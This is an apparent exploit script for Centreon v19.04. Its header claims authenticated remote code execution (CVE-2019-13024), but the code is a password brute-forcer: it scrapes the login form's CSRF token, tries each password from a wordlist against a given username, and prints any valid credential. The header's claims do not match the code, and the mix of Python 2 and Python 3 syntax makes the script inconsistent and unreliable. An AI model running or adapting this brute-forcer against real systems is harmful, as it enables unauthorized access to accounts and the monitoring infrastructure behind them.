#!/usr/bin/python

'''
# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
# Date: 28/06/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-13024
# Vendor Homepage: https://www.centreon.com/
# Software link: https://download.centreon.com
# Version: v19.04
# Tested on: CentOS 7.6 / PHP 5.4.16
'''
from termcolor import colored
import requests
import os
import sys
import warnings
import argparse
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

parser = argparse.ArgumentParser(description='Centreon Login Bruteforce')
parser.add_argument('--url',help='Centreon URL eg: http://10.12.1.288/centreon')
parser.add_argument('-u',help='Username')
parser.add_argument('-w',help='Wordlist')
args = parser.parse_args()



url = args.url
username = args.u
password_wordlist = args.w

password_file = open(password_wordlist,"r").read().splitlines()

success = 0


proxies = {
			"http" : "http://127.0.0.1:8080",
		     	"https" : "https://127.0.0.1:8080",
			    }

while success==0:


    for password in password_file:

        
	   

        request = requests.session()
        print("[+] Retrieving CSRF token to submit the login form")
        page = request.get(url+"/index.php",allow_redirects=False,proxies=proxies)
        html_content = page.text
        soup = BeautifulSoup(html_content,features="lxml")
        token = soup.findAll('input')[3].get("value")

        login_info = {
            "useralias": username,
            "password": password,
            "submitLogin": "Connect",
            "centreon_token": token
        }
        login_request = request.post(url+"/index.php", login_info,allow_redirects=False,proxies=proxies)
        print("[+] Login token is : {0}".format(token))


        if login_request.status_code==302:
            print "[+] Logged In Successfully"
            print username +":" + password + colored('(VALID)','green')
            success =1
	    sys.exit(0)

        else:
            print username +":" + password + colored('(INVALID)','red')
            success = 0
            
            


	   
